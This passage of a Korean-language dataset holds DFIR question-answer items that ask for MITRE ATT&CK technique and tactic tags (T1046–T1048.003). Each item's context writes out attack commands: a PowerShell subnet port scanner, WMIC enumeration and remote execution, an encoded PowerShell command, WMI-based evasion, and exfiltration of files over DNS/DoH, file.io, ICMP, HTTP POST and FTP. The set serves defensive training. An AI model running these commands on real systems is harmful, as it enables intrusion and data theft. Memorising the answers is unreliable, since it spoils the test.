것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1046_T1046-7_Q7", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1046 Network Service Discovery (Tactic: Discovery)\n[요약] PowerShell과 .NET TcpClient를 사용해 /24 서브넷 내 호스트의 특정 포트(기본 445, 3389)를 스캔하는 시나리오이다. IP 주소를 직접 지정하거나, 지정하지 않으면 로컬 시스템의 기본 IPv4 인터페이스 정보를 기반으로 /24 대역을 자동 탐지해 스캔한다.\n[절차] 입력 인자 ip_address를 확인해 쉼표(,)가 포함된 다중 IP 리스트인지, 단일 IP인지, 또는 공백인지 판단한다. 여러 IP가 지정된 경우 각 IP와 port_list에 지정된 포트 각각에 대해 TcpClient.ConnectAsync를 사용해 연결을 시도하고, 연결에 성공하면 해당 포트가 열려 있음을 출력한다. ip_address가 비어 있으면 Get-NetIPInterface와 Get-NetIPAddress를 사용해 기본 IPv4 인터페이스와 IP 주소를 자동으로 선택한다. 선택된 IP 주소의 앞 세 옥텟을 기준으로 /24 서브넷(1~254)을 구성하고, 각 IP와 port_list에 대해 TcpClient.ConnectAsync로 연결을 시도한다. 연결에 성공한 IP:포트 조합에 대해 \"Port <port> is open on <ip>\" 메시지를 출력한다.\n[대표 명령 예시]\n$ipAddr = \"#{ip_address}\"; if ($ipAddr -like \"*,*\") { $ip_list = $ipAddr -split \",\"; $ip_list = $ip_list.ForEach({ $_.Trim() }); Write-Host \"[i] IP Address List: $ip_list\"; $ports = #{port_list}; foreach ($ip in $ip_list) { foreach ($port in $ports) { Write-Host \"[i] Establishing connection to: $ip : $port\"; try { $tcp = New-Object Net.Sockets.TcpClient; $tcp.ConnectAsync($ip, $port).Wait(#{timeout_ms}) | Out-Null } catch {} if ($tcp.Connected) { $tcp.Close(); Write-Host \"Port $port is open on $ip\" } } } } elseif ($ipAddr -notlike \"*,*\") { if ($ipAddr -eq \"\") { $interface = Get-NetIPInterface -AddressFamily IPv4 -ConnectionState Connected | Select-Object -ExpandProperty InterfaceAlias -First 1; Write-Host \"[i] Using Interface $interface\"; $ipAddr = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $interface | Select-Object -ExpandProperty IPAddress } Write-Host \"[i] Base IP-Address for Subnet: $ipAddr\"; $subnetSubstring = $ipAddr.Substring(0, $ipAddr.LastIndexOf('.') + 1); Write-Host \"[i] Assuming /24 subnet. scanning $subnetSubstring'1' to $subnetSubstring'254'\"; $ports = #{port_list}; $subnetIPs = 1..254 | ForEach-Object { \"$subnetSubstring$_\" }; foreach ($ip in $subnetIPs) { foreach ($port in $ports) { try { $tcp = New-Object Net.Sockets.TcpClient; $tcp.ConnectAsync($ip, $port).Wait(#{timeout_ms}) | Out-Null } catch {} if ($tcp.Connected) { $tcp.Close(); Write-Host \"Port $port is open on $ip\" } } } } else { Write-Host \"[Error] Invalid Inputs\"; exit 1 }", "answer": "이 행위는 MITRE ATT&CK의 T1046 \"Network Service Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1046_T1046-8_Q8", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1046 Network Service Discovery (Tactic: Discovery)\n[요약] PowerShell의 Get-Service cmdlet을 사용해 로컬 시스템에서 원격 데스크톱 관련 서비스(Remote Desktop Services, Remote Desktop Configuration)의 상태를 조회하는 간단한 서비스 발견 시나리오이다. 이를 통해 RDP 기능 활성화 여부를 확인할 수 있다.\n[절차] 관리자 권한 PowerShell 세션을 실행한다. Get-Service -Name \"Remote Desktop Services\", \"Remote Desktop Configuration\" 명령을 수행한다. 각 서비스의 Status, DisplayName, ServiceName 등을 통해 RDP 관련 서비스가 실행 중인지 확인한다.\n[대표 명령 예시]\nGet-Service -Name \"Remote Desktop Services\", \"Remote Desktop Configuration\"", "answer": "이 행위는 MITRE ATT&CK의 T1046 \"Network Service Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1047_T1047-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1047 Windows Management Instrumentation (Tactic: Execution)\n[요약] wmic useraccount 쿼리를 통해 로컬 시스템의 모든 사용자 계정을 나열하는 정찰 시나리오이다. WMI를 이용해 계정 목록 및 속성을 한 번에 수집함으로써 계정 구조를 파악하는 행위를 모사한다.\n[절차] 명령 프롬프트(cmd.exe)를 실행한다. wmic useraccount get /ALL /format:csv 명령을 실행해 모든 로컬 사용자 계정 정보를 CSV 형식으로 조회한다. 출력된 CSV 결과에서 계정 이름, SID, 상태 등 계정 관련 정보를 확인한다.\n[대표 명령 예시]\nwmic useraccount get /ALL /format:csv", "answer": "이 행위는 MITRE ATT&CK의 T1047 \"Windows Management Instrumentation\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1047_T1047-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1047 Windows Management Instrumentation (Tactic: Execution)\n[요약] wmic process 쿼리를 이용해 현재 실행 중인 프로세스 목록과 실행 경로, 명령줄 인자를 수집하는 정찰 시나리오이다. 공격자는 이를 통해 보안 제품·관리 에이전트·기타 프로세스를 식별하고 후속 공격에 활용할 수 있다.\n[절차] 명령 프롬프트(cmd.exe)를 실행한다. wmic process get caption,executablepath,commandline /format:csv 명령을 실행한다. 각 프로세스의 이름(caption), 실행 파일 경로(executablepath), 명령줄(commandline)을 CSV 형식으로 출력된 결과에서 확인한다.\n[대표 명령 예시]\nwmic process get caption,executablepath,commandline /format:csv", "answer": "이 행위는 MITRE ATT&CK의 T1047 \"Windows Management Instrumentation\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1047_T1047-3_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1047 Windows Management Instrumentation (Tactic: Execution)\n[요약] wmic qfe 쿼리를 사용해 설치된 핫픽스 및 패치 목록을 수집하는 정찰 시나리오이다. 공격자는 패치 이력을 확인해 특정 취약점(CVE)이 미패치된 시스템을 찾아낼 수 있다.\n[절차] 명령 프롬프트(cmd.exe)를 실행한다. wmic qfe get description,installedOn /format:csv 명령을 실행한다. 출력된 CSV에서 각 패치의 설명(description)과 설치일(InstalledOn)을 확인한다.\n[대표 명령 예시]\nwmic qfe get description,installedOn /format:csv", "answer": "이 행위는 MITRE ATT&CK의 T1047 \"Windows Management Instrumentation\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1047_T1047-4_Q4", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1047 Windows Management Instrumentation (Tactic: Execution)\n[요약] 원격 또는 로컬 노드에서 특정 서비스가 실행 중인지 확인하기 위해 wmic service 쿼리를 수행하는 시나리오이다. 기본값으로 로컬(127.0.0.1)과 인쇄 스풀러(Spooler)를 조회하며, 원격 RPC 오류나 서비스 미존재 시의 응답도 함께 확인할 수 있다.\n[절차] 명령 프롬프트(cmd.exe)를 실행한다. wmic /node:\"#{node}\" service where (caption like \"%#{service_search_string}%\") 명령을 실행한다. 지정한 node(기본 127.0.0.1)에서 service_search_string(기본 Spooler)이 포함된 서비스 정보를 조회한다. \"No instance(s) Available\" 메시지가 나오면 서비스가 없음을, RPC 오류 메시지가 나오면 원격 노드에 접근 불가 상태임을 의미한다.\n[대표 명령 예시]\nwmic /node:\"#{node}\" service where (caption like \"%#{service_search_string}%\")", "answer": "이 행위는 MITRE ATT&CK의 T1047 \"Windows Management Instrumentation\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1047_T1047-5_Q5", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1047 Windows Management Instrumentation (Tactic: Execution)\n[요약] wmic process call create를 사용해 로컬 호스트에서 프로세스를 생성하는 시나리오이다. 기본값으로 notepad.exe를 실행하며, cleanup 단계에서 동일한 이름의 프로세스를 WMI를 이용해 종료한다.\n[절차] 명령 프롬프트(cmd.exe)를 실행한다. wmic process call create #{process_to_execute} 명령을 실행해 로컬에서 지정된 프로세스를 생성한다(기본 notepad.exe). 작업 관리자 또는 프로세스 목록에서 새로운 프로세스가 실행 중인지 확인한다.\n[대표 명령 예시]\nwmic process call create #{process_to_execute}", "answer": "이 행위는 MITRE ATT&CK의 T1047 \"Windows Management Instrumentation\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1047_T1047-6_Q6", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1047 Windows Management Instrumentation (Tactic: Execution)\n[요약] wmic /user /password /node 옵션을 사용해 원격 호스트에서 프로세스를 생성하는 시나리오이다. 제공된 자격 증명(DOMAIN\\Administrator / P@ssw0rd1)을 사용해 원격 노드에 접속한 뒤 notepad.exe를 실행하는 예시를 모사한다.\n[절차] 명령 프롬프트(cmd.exe)를 실행한다. wmic /user:#{user_name} /password:#{password} /node:\"#{node}\" process call create #{process_to_execute} 명령을 실행한다. 지정된 원격 호스트 #{node}에 WMI를 통해 접속하여 #{process_to_execute}(기본 notepad.exe)를 생성한다. 원격 호스트 측에서 작업 관리자나 세션을 통해 프로세스가 실행되었는지 확인한다.\n[대표 명령 예시]\nwmic /user:#{user_name} /password:#{password} /node:\"#{node}\" process call create #{process_to_execute}", "answer": "이 행위는 MITRE ATT&CK의 T1047 \"Windows Management Instrumentation\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1047_T1047-7_Q7", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1047 Windows Management Instrumentation (Tactic: Execution)\n[요약] PowerShell -EncodedCommand 옵션을 사용해 WMI 기반 프로세스 생성을 감추는 시나리오이다. Base64로 인코딩된 명령은 Invoke-WmiMethod win32_process -Name create -ArgumentList notepad.exe를 수행하며, 결과적으로 WMI를 통해 notepad.exe가 생성된다.\n[절차] 명령 프롬프트(cmd.exe)를 실행한다. powershell -exec bypass -e <Base64 명령> 형태의 명령을 실행한다. Base64로 인코딩된 내용은 Invoke-WmiMethod -Path win32_process -Name create -ArgumentList notepad.exe 명령을 디코딩해 실행한다. 테스트 완료 후 notepad.exe 프로세스가 실행 중인지 확인한다.\n[대표 명령 예시]\npowershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA", "answer": "이 행위는 MITRE ATT&CK의 T1047 \"Windows Management Instrumentation\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1047_T1047-8_Q8", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1047 Windows Management Instrumentation (Tactic: Execution)\n[요약] 기존 Win32_Process 클래스를 상속한 새 WMI 클래스를 생성한 뒤, 해당 파생 클래스를 통해 프로세스를 생성하는 은폐 기법을 시뮬레이션한다. 보안 솔루션이 Win32_Process::Create 호출만을 탐지할 경우 탐지를 우회할 수 있는 패턴을 재현한다.\n[절차] 관리자 권한 PowerShell을 실행한다. New-Object Management.ManagementClass와 ManagementPath(\"Win32_Process\")를 이용해 기본 Win32_Process 클래스를 참조한다. Derive(\"#{new_class}\")를 호출해 새 파생 클래스(기본 Win32_Atomic)를 생성하고 Put()으로 WMI 저장소에 등록한다. Invoke-WmiMethod -Path #{new_class} -Name create -ArgumentList #{process_to_execute} 명령을 사용해 파생 클래스를 통해 프로세스를 생성한다. cleanup 단계에서 새로 만든 클래스 인스턴스를 Delete()해 정리한다.\n[대표 명령 예시]\n$Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath(\"Win32_Process\")); $NewClass = $Class.Derive(\"#{new_class}\"); $NewClass.Put(); Invoke-WmiMethod -Path #{new_class} -Name create -ArgumentList #{process_to_execute}", "answer": "이 행위는 MITRE ATT&CK의 T1047 \"Windows Management Instrumentation\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1047_T1047-9_Q9", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1047 Windows Management Instrumentation (Tactic: Execution)\n[요약] wmic process call create를 이용해 rundll32.exe로 지정된 DLL의 함수를 호출하는 시나리오이다. 먼저 PowerShell로 calc.dll을 원격에서 다운로드해 디스크에 저장한 뒤, WMI를 통해 rundll32.exe \"dll\" 함수 형식으로 실행한다.\n[절차] PowerShell을 사용해 #{dll_to_execute} 경로에 DLL이 존재하는지 Test-Path로 확인한다. 없을 경우 ExternalPayloads 디렉터리를 생성하고 GitHub URL에서 calc.dll을 다운로드해 #{dll_to_execute} 경로에 저장한다. 명령 프롬프트에서 wmic /node:#{node} process call create \"rundll32.exe \\\"#{dll_to_execute}\\\" #{function_to_execute}\" 명령을 실행해 원격 또는 로컬 노드에서 rundll32를 통해 DLL 함수를 실행한다. DLL이 calc.dll인 경우 계산기 프로세스가 실행되는지 확인한다.\n[대표 명령 예시]\nwmic /node:#{node} process call create \"rundll32.exe \\\"#{dll_to_execute}\\\" #{function_to_execute}\"", "answer": "이 행위는 MITRE ATT&CK의 T1047 \"Windows Management Instrumentation\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1047_T1047-10_Q10", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1047 Windows Management Instrumentation (Tactic: Execution)\n[요약] wmic product where ... call uninstall 명령을 사용해 MSI 기반으로 설치된 애플리케이션을 제거하는 시나리오이다. APT가 보안 제품(TightVNC 등)을 제거하기 위해 사용할 수 있는 패턴을 모사하며, 사전 단계에서 TightVNC를 설치한 뒤 WMIC로 언인스톨을 수행한다.\n[절차] PowerShell에서 TightVNC 실행 파일 경로(C:\\Program Files 또는 C:\\Program Files (x86))가 존재하는지 Test-Path로 확인해 설치 여부를 판단한다. 설치되어 있지 않은 경우, TightVNC MSI 설치 파일을 ExternalPayloads 폴더로 다운로드하고 msiexec /i ... /qn /norestart 명령으로 무인 설치를 수행한다. 명령 프롬프트를 관리자 권한으로 실행한다. wmic /node:\"#{node}\" product where \"name like '#{product}%%'\" call uninstall 명령을 실행해 대상 제품(기본 Tightvnc)을 언인스톨한다. WMIC 출력에서 언인스톨 성공/실패 상태를 확인한다.\n[대표 명령 예시]\nwmic /node:\"#{node}\" product where \"name like '#{product}%%'\" call uninstall", "answer": "이 행위는 MITRE ATT&CK의 T1047 \"Windows Management Instrumentation\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Execution이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1048_T1048-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1048 Exfiltration Over Alternative Protocol (Tactic: Exfiltration)\n[요약] DNSExfiltrator PowerShell 모듈을 이용해 DNS 요청을 통해 파일을 유출하는 DNS 터널링 시나리오이다. 전달되는 DNS 쿼리를 DNS-over-HTTPS(DoH)로 감싸 전송함으로써, 일반 DNS 트래픽뿐 아니라 HTTPS 기반 DoH 트래픽을 통한 은닉 유출도 재현한다.\n[절차] 지정한 경로(ps_module)에 DNSExfiltrator PowerShell 스크립트가 존재하는지 Test-Path로 확인한다. 존재하지 않으면 ExternalPayloads 디렉터리를 생성하고 GitHub(raw.githubusercontent.com)에서 Invoke-DNSExfiltrator.ps1을 다운로드해 ps_module 위치에 저장한다. PowerShell에서 Import-Module \"#{ps_module}\" 명령으로 DNSExfiltrator 모듈을 로드한다. Invoke-DNSExfiltrator -i \"#{ps_module}\" -d #{domain} -p #{password} -doh #{doh} -t #{time} #{encoding} 명령을 실행해, 지정한 도메인으로 DoH 기반 DNS 요청을 반복 전송하며 파일(여기서는 ps_module 자체)을 유출한다. 실행 중 생성되는 DNS/DoH 트래픽과 도메인 쿼리 패턴을 네트워크 모니터링 도구로 관찰할 수 있다.\n[대표 명령 예시]\nImport-Module \"#{ps_module}\"; Invoke-DNSExfiltrator -i \"#{ps_module}\" -d #{domain} -p #{password} -doh #{doh} -t #{time} #{encoding}", "answer": "이 행위는 MITRE ATT&CK의 T1048 \"Exfiltration Over Alternative Protocol\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Exfiltration이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1048.002_T1048.002-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1048.002 Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol (Tactic: Exfiltration)\n[요약] Windows 환경에서 curl.exe를 이용해 HTTPS 파일 공유 서비스(file.io)로 데이터를 업로드하는 시나리오이다. 사전 단계에서 curl이 없으면 다운로드하여 C:\\Windows\\System32\\Curl.exe로 배치하고, 테스트용 파일(artifact)을 준비한 후 HTTPS POST 업로드를 수행한다.\n[절차] PowerShell에서 Test-Path #{curl_path}로 시스템에 curl.exe가 존재하는지 확인한다. 존재하지 않을 경우 ExternalPayloads 디렉터리를 만들고, curl 공식 사이트에서 Windows용 curl.zip을 다운로드한 뒤 Expand-Archive로 압축을 해제한다. 해제된 폴더에서 curl.exe를 C:\\Windows\\System32\\Curl.exe 위치로 복사해 시스템 전역에서 사용 가능하도록 한다. 다음으로 Test-Path \"#{input_file}\"로 업로드 대상 테스트 파일이 존재하는지 확인한다. 없으면 입력 파일 경로의 상위 디렉터리를 생성한 후, GitHub에서 artifact 파일을 다운로드해 #{input_file} 위치에 저장한다. 명령 프롬프트(cmd.exe)에서 #{curl_path} -k -F \"file=@#{input_file}\" https://file.io/ 명령을 실행해 HTTPS를 통해 file.io에 파일을 업로드한다. 성공 시 file.io에서 반환하는 JSON 응답(다운로드 링크 등)이 stdout으로 표시된다.\n[대표 명령 예시]\n#{curl_path} -k -F \"file=@#{input_file}\" https://file.io/", "answer": "이 행위는 MITRE ATT&CK의 T1048.002 \"Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Exfiltration이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1048.003_T1048.003-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1048.003 Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol (Tactic: Exfiltration)\n[요약] PowerShell의 .NET Ping 클래스를 이용해 특정 파일(기본: notepad.exe)을 바이트 단위로 읽어 ICMP 에코 요청 패킷으로 전송하는 시나리오이다. 공격자는 ICMP 트래픽을 수집·복원해 파일 내용을 재구성할 수 있다.\n[절차] 대상 파일(기본: C:\\Windows\\System32\\notepad.exe)이 존재하는지 확인한다. PowerShell을 실행한다. PowerShell에서 $ping = New-Object System.Net.Networkinformation.ping 객체를 생성한다. Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024 명령으로 파일을 1024 바이트 단위로 읽는다. 각 청크($Data)에 대해 $ping.Send(\"#{ip_address}\", 1500, $Data) 호출을 수행해 ICMP 에코 요청 패킷의 페이로드로 전송한다. 네트워크 캡처 도구(예: Wireshark)로 #{ip_address}로 향하는 ICMP 트래픽과 페이로드의 분포를 확인한다.\n[대표 명령 예시]\n$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send(\"#{ip_address}\", 1500, $Data) }", "answer": "이 행위는 MITRE ATT&CK의 T1048.003 \"Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Exfiltration이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1048.003_T1048.003-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1048.003 Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol (Tactic: Exfiltration)\n[요약] PowerShell Invoke-WebRequest를 이용해 HTTP POST 요청으로 파일 내용을 전송하는 시나리오이다. 기본적으로 notepad.exe의 내용을 문자열로 읽어, http://127.0.0.1 엔드포인트로 POST 전송한다.\n[절차] 대상 파일(기본: C:\\Windows\\System32\\notepad.exe)의 존재를 확인한다. PowerShell을 실행한다. $content = Get-Content #{input_file} 명령으로 파일 내용을 텍스트(줄 단위 문자열)로 읽어온다. Invoke-WebRequest -Uri #{ip_address} -Method POST -Body $content 명령을 실행해 HTTP POST 요청을 전송한다. 서버 측(예: 간단한 HTTP 서버나 프록시 로그)에서 요청 바디에 파일 내용이 포함되어 도착했는지 확인한다.\n[대표 명령 예시]\n$content = Get-Content #{input_file}; Invoke-WebRequest -Uri #{ip_address} -Method POST -Body $content", "answer": "이 행위는 MITRE ATT&CK의 T1048.003 \"Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Exfiltration이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1048.003_T1048.003-3_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1048.003 Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol (Tactic: Exfiltration)\n[요약] PowerShell Send-MailMessage cmdlet을 이용해 파일을 이메일 첨부 파일로 전송하는 시나리오이다. 기본적으로 notepad.exe를 첨부해 T1048.003 Atomic Test 제목의 메일을 지정한 SMTP 서버를 통해 송신한다.\n[절차] 입력 파일(기본: C:\\Windows\\System32\\notepad.exe)이 존재하는지 확인한다. SMTP 서버 주소 #{smtp_server}와 송수신자 이메일 주소 #{sender}, #{receiver}가 올바르게 설정되어 있는지 확인한다. PowerShell을 실행한다. Send-MailMessage -From #{sender} -To #{receiver} -Subject \"T1048.003 Atomic Test\" -Attachments #{input_file} -SmtpServer #{smtp_server} 명령을 실행한다. SMTP 서버 또는 수신 메일함에서 첨부 파일이 포함된 메일이 도착했는지 확인해, 파일이 SMTP를 통해 유출되었는지 검증한다.\n[대표 명령 예시]\nSend-MailMessage -From #{sender} -To #{receiver} -Subject \"T1048.003 Atomic Test\" -Attachments #{input_file} -SmtpServer #{smtp_server}", "answer": "이 행위는 MITRE ATT&CK의 T1048.003 \"Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Exfiltration이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1048.003_T1048.003-4_Q4", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1048.003 Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol (Tactic: Exfiltration)\n[요약] MAZE 랜섬웨어에서 관찰된 것과 유사하게, %windir%\\temp 디렉터리 내의 7z 압축 파일들을 FTP 서버로 업로드하는 시나리오이다. WebClient와 FTP를 활용해 이미 압축된 데이터 패키지를 외부로 유출하는 패턴을 재현한다.\n[절차] FTP 서버 #{ftp_server}가 가동 중이며, #{username} / #{password} 계정으로 로그인 가능한지 확인한다. %windir%\\temp 경로에 *.7z 파일이 존재하는지 확인하거나, 필요 시 테스트용 7z 파일을 생성한다. PowerShell을 실행한다. $Dir_to_copy = \"$env:windir\\temp\"를 설정하고, $ftp = \"ftp://#{ftp_server}/\"로 FTP 기본 URL을 구성한다. New-Object System.Net.WebClient를 생성하고 Credentials에 #{username}, #{password}를 설정한다. test-connection -count 1 -computername \"#{ftp_server}\" -quiet 명령으로 FTP 서버에 ICMP로 접근 가능한지 확인한다. 연결이 가능하면 dir $Dir_to_copy \"*.7z\"로 7z 파일 목록을 반복하며, 각 파일에 대해 $web_client.UploadFile($uri, $file.FullName)을 호출해 FTP 서버로 업로드한다. FTP 서버 측에서 업로드된 7z 파일들이 존재하는지 확인한다.\n[대표 명령 예시]\n$Dir_to_copy = \"$env:windir\\temp\"; $ftp = \"ftp://#{ftp_server}/\"; $web_client = New-Object System.Net.WebClient; $web_client.Credentials = New-Object System.Net.NetworkCredential('#{username}', '#{password}'); if (test-connection -count 1 -computername \"#{ftp_server}\" -quiet) { foreach($file in (dir $Dir_to_copy \"*.7z\")) { echo \"Uploading $file...\"; $uri = New-Object System.Uri($ftp+$file.name); $web_client.UploadFile($uri, $file.FullName) } } else { echo \"FTP Server Unreachable. Please verify the server address in input args and try again.\" }", "answer": "이 행위는 MITRE ATT&CK의 T1048.003 \"Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Exfiltration이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
